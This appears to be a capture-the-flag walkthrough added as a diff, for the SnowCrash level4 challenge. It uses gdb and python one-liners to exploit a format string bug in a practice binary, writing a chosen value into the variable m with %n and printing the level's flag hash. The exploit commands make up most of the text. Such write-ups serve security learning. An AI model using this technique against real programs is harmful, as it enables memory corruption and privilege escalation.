@@ -1,0 +1,48 @@
+# Again, a format string vulnerability
+
+# Let's find the address of m
+(gdb) disas n
+Dump of assembler code for function n:
+[...]
+0x0804848d <+54>:	mov    0x8049810,%eax
+0x08048492 <+59>:	cmp    $0x1025544,%eax
+[...]
+
+(gdb) x/x 0x8049810
+0x8049810 <m>:	0x00000000
+
+# 0x8049810 is the address where we want to write
+
+================================================================================
+
+# We put our address on the stack by putting it in our arg list, now we must find
+	where it in our stack
+
+level4@SnowCrash:~$ python -c 'print "\x10\x98\x04\x08" + "%x "*15' > /tmp/l
+level4@SnowCrash:~$ cat /tmp/l | ./level4
+b7ff26b0 bffff784 b7fd0ff4 0 0 bffff748 804848d bffff540 200 b7fd1ac0 b7ff37d0 8049810 25207825 78252078 20782520
+
+# Our address is displayed at 12%x so we will %n at 11 to write inside
+(gdb) x/x 0x8049810
+0x8049810 <m>:	0x00000048 # We wrote 0x48 in our variable :)
+
+================================================================================
+
+# Now the problem is that we have to write a pretty big value 0x1025544=16930116
+	# Our buffer is 520 bytes large, we won't be able to write all those
+		characters
+	# Hopefully, we can write a lot of characters with %???x, %100x will write
+		100 spaces
+
+level4@SnowCrash:~$ python -c 'print "\x10\x98\x04\x08"+"%900x"+"%x"*10+"%n"' > /tmp/l
+(gdb) x/x 0x8049810
+0x8049810 <m>:	0x000003c4
+
+# We just have to find the right value then it should be good :)
+
+================================================================================
+level4@SnowCrash:~$ python -c 'print "\x10\x98\x04\x08"+"%16930052x"+"%x"*10+"%n"' > /tmp/l
+level4@SnowCrash:~$ cat /tmp/l | ./level4
+[...]
+0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+[...]
